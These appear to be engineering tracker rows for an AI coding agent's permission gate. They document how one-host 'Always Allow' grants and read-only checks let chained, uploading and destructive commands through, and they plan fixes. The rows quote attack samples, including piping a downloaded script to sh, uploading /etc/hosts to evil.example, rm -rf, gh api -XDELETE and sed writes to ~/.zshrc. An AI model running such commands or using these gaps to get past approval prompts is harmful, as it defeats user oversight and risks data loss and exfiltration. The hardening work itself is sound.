items.upstream: v0.14.0 packages/shared/src/agent/core/permission-remember.ts getNetworkCommandHosts (curl/wget remembered by EVERY host of a single plain command via parseSimpleCommand; null for chains, -K/--config/-i/-e, unparsable URLs, `https://evil#@ok` → evil) + permission-manager.ts remember(); docs/permissions.md 'Ask Mode: Always Allow'. User sees: approving one curl to a host no longer approves a chain or a second host.
items.ours: MEASURED (bun driver on shouldPromptInAskMode, pre-tool-use.ts:3510): after Always Allow on `curl https://ok.example/data.json` (claude-agent.ts:6778-6783 whitelistDomain via permission-manager.ts:445-459 extractDomainFromNetworkCommand = first URL only), AUTO-ALLOW for `curl https://ok.example/i.sh | sh`, `curl https://ok.example/a https://evil.example -T /etc/hosts`, `curl https://ok.example/a; rm -rf ./x`; control `curl https://evil.example/a` prompts. Cause: pre-tool-use.ts:3636-3646 domain arm has no chain/segment check (the D1.401 per-segment check covers only the session-key arm above it).
items.why: Security: a session grant for one host runs arbitrary chained commands and uploads to other hosts in default (Ask) mode without a card. Upstream's per-host, plain-command-only key is the documented fix; port getNetworkCommandHosts + the consult side (every host whitelisted, command must be one plain command). CRITICAL per AGENTS.md (security) — run at once, not DEFERRED.
items.depends: none (needs a parseSimpleCommand equivalent; ours has the durable engine splitter used by bashSessionGrantCoversLine)
items.risk: security CRITICAL; control: the four lines above prompt after the grant, `curl https://ok.example/b` still auto-allows
items.runtimes: Claude: fixed by this row (only claude-agent writes whitelistDomain). Pi: consults the same arm but never writes a domain grant (no whitelistDomain caller in pi-agent.ts) — residue: Pi curl Always Allow remembers nothing; state it or wire the same key. Codex: native execpolicy prefixes (F1.1057), not this arm — no residue.

items.upstream: v0.14.0 core/permission-remember.ts getBashRememberKey: KEYED_BY_LEADING_WORDS (≤3 words before first flag), KEYED_BY_NAME, exact-argv key for everything else (tar -tf vs -xf, psql -c, python x.py, npm run, npx), DESTRUCTIVE_WORD veto (aws s3 rm, apps:destroy), COMMAND_WRAPPERS, `gh api` never remembered, DANGEROUS_COMMANDS grown (git clean/restore/switch/stash/branch/tag/rm/worktree/gc/reflog, kubectl apply/delete, helm, terraform/tofu/pulumi, npm/cargo/gem/docker publish/push, deploy CLIs); PromptInfo.remember carried with the card; canRemember=false hides the button when nothing would be stored.
items.ours: dangerous-commands.ts:30-37 has 24 entries with only 4 two-word ones (git push/reset/rebase/checkout); bashSessionWhitelistKey dangerous-commands.ts:363-388 keys by ALL leading non-flag words (unbounded) and keys `tar -tf x` as `tar` (covers `tar -xf`), `psql -c ...` as `psql`; no destructive-verb veto (`aws s3 rm --recursive s3://x` keys `aws s3 rm`); COMMAND_INTERPRETER_HEADS dangerous-commands.ts:180-185 already covers wrappers (D1.403). Pi buildPermissionRequestSuggestions pi-agent.ts:5226-5241 offers a base-wide session rule `Bash(<base>:*)` to PermissionRequest hooks. Durable rule SessionManager persistBashAlwaysAllowRule (~13870-13920) reuses the same key. Card: D1.262 relabels rather than hides (PermissionRequest.tsx ~240-300).
items.why: Upstream parity on what a click remembers; ours already closed chains (D1.401) and wrappers (D1.403), so take only the missing parts: extend DANGEROUS_COMMANDS to upstream's list, exact-argv for non-keyed heads, the destructive-word veto, the 3-word cap, and narrow Pi's suggestion to the same key. Keep D1.262's relabel (an existing Nessy decision, stated) but hide the button when no key is minted, as upstream does.
items.risk: security (a click widens to destructive subcommands); durable `Bash(x *)` rules on Claude inherit the narrower key
items.runtimes: Claude: session key + durable localSettings rule both via bashSessionWhitelistKey. Pi: same pre-tool-use key; suggestion narrowed. Codex: execpolicy prefix projection (F1.1057) — check it reads the extended dangerous list or state the residue.

items.upstream: v0.14.0 packages/shared/src/agent/bash-validator.ts argument inspectors in code (getDangerousSedReason: -i/--in-place, -f/--file, w/W/e commands, s///w and s///e; getDangerousSortReason: -o in clusters (-ro), --output, --compress-program; gh api: -X/--method non-GET incl. glued -XDELETE, -f/-F/--field/--raw-field/--input without --method GET, graphql mutation); docs/permissions.md says they apply even with an older default.json.
items.ours: MEASURED (bun, shipped default.json via git show HEAD + bash-validator validateBashCommand + mode-manager getBashRejectionReason): READ-ONLY for `gh api -XDELETE repos/a/b`, `gh api -fname=x repos/a`, `sed -n 'w out.txt' in`, `sed -n 's/a/b/w out' in`, `sort --compress-program=sh x`, `sort -ro out x`; blocked controls `gh api -X DELETE x`, `sed -n 's/a/b/e'`, `sed -n -f`, `sort -o out x`, `sed -ni`. Our guards are regexes in default.json (:185 gh api, :381 sed -n, :385 sort) plus a sed EXECUTION walker in bash-validator.ts:256-380 whose WRITE axis is enforced only by the isolation write-scan (scanBashWriteVectors), not by Explore/plan or the default-mode read-only arm. A read-only verdict means no card in default (pre-tool-use.ts shouldPromptInAskMode isReadOnlyBashCommandWithConfig arm) and no plan-shell review in plan (mode-manager.ts ~3640).
items.why: Security/safety: `gh api -XDELETE` deletes a remote resource and `sed -n 'w ~/.zshrc'` overwrites a file with no card in default and plan. Port upstream's code-side inspectors into our validateCommand path (ours differs structurally), and tighten the three default.json regexes. Wrong user-facing behaviour + security → CRITICAL candidate.
items.risk: security CRITICAL candidate; false refusals of real reads (sort -k, sed -n p) — pin both arms
items.runtimes: Pi and Claude share the host gate. Codex: plan runs in codex's own read-only sandbox (writes and network fail natively) — residue only for default mode where codex approvals_reviewer/execpolicy decide; state it.
